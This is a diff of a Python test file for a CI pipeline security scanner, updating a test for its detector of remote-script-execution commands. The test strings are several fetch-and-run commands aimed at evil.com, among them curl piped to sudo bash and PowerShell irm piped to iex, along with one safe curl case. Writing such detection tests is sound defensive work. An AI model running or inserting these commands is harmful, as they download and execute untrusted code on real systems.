@@ -227,21 +227,27 @@ def test_bug_e_gha008_still_adds_todo_without_existing_comment():
 # Widened shared regex coverage
 # ────────────────────────────────────────────────────────────────────────
 
-def test_curl_pipe_re_new_patterns():
-    from pipeline_check.core.checks.base import CURL_PIPE_RE
+def test_remote_script_exec_primitive_new_patterns():
+    from pipeline_check.core.checks._primitives import remote_script_exec
     # bash -c "$(curl ...)"
-    assert CURL_PIPE_RE.search('bash -c "$(curl https://evil.com/install.sh)"')
+    assert remote_script_exec.scan('bash -c "$(curl https://evil.com/install.sh)"')
     # curl | sudo bash
-    assert CURL_PIPE_RE.search("curl https://evil.com/install.sh | sudo bash")
+    assert remote_script_exec.scan("curl https://evil.com/install.sh | sudo bash")
     # PowerShell irm | iex
-    assert CURL_PIPE_RE.search("irm https://evil.com/install.ps1 | iex")
-    assert CURL_PIPE_RE.search("Invoke-WebRequest https://evil.com/install.ps1 | iex")
+    assert remote_script_exec.scan("irm https://evil.com/install.ps1 | iex")
+    assert remote_script_exec.scan("Invoke-WebRequest https://evil.com/install.ps1 | iex")
     # python -c "requests.get("
-    assert CURL_PIPE_RE.search('python -c "requests.get(\'https://evil.com/payload\')"')
+    assert remote_script_exec.scan(
+        'python -c "requests.get(\'https://evil.com/payload\')"'
+    )
     # curl > x.sh && bash x
-    assert CURL_PIPE_RE.search("curl https://evil.com > install.sh && bash install.sh")
+    assert remote_script_exec.scan(
+        "curl https://evil.com > install.sh && bash install.sh"
+    )
     # Safe: curl without pipe — should NOT match
-    assert not CURL_PIPE_RE.search("curl -o output.json https://api.example.com/data")
+    assert not remote_script_exec.scan(
+        "curl -o output.json https://api.example.com/data"
+    )
 
 
 def test_docker_insecure_re_new_patterns():
